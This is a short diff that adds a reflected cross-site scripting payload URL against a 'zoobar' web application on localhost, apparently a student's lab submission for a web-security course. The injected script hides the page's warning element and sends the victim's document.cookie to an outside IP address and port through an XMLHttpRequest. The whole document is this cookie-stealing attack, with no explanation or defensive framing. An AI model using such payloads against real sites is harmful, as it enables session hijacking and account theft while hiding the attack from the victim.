@@ -1,0 +1,9 @@
+http://localhost:8080/zoobar/index.cgi/users?user=" size=10><script>
+document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);
+function theDomHasLoaded(e) { 
+document.getElementById("warning").style.visibility = 'hidden';
+}
+var req = new XMLHttpRequest();
+req.open("GET", "http://172.27.22.170:12345?payload="+encodeURIComponent(document.cookie)+"&roll=13538 & random=" + Math.random() + "&timestamp=" + Date.now(), true);
+req.send();
+</script></
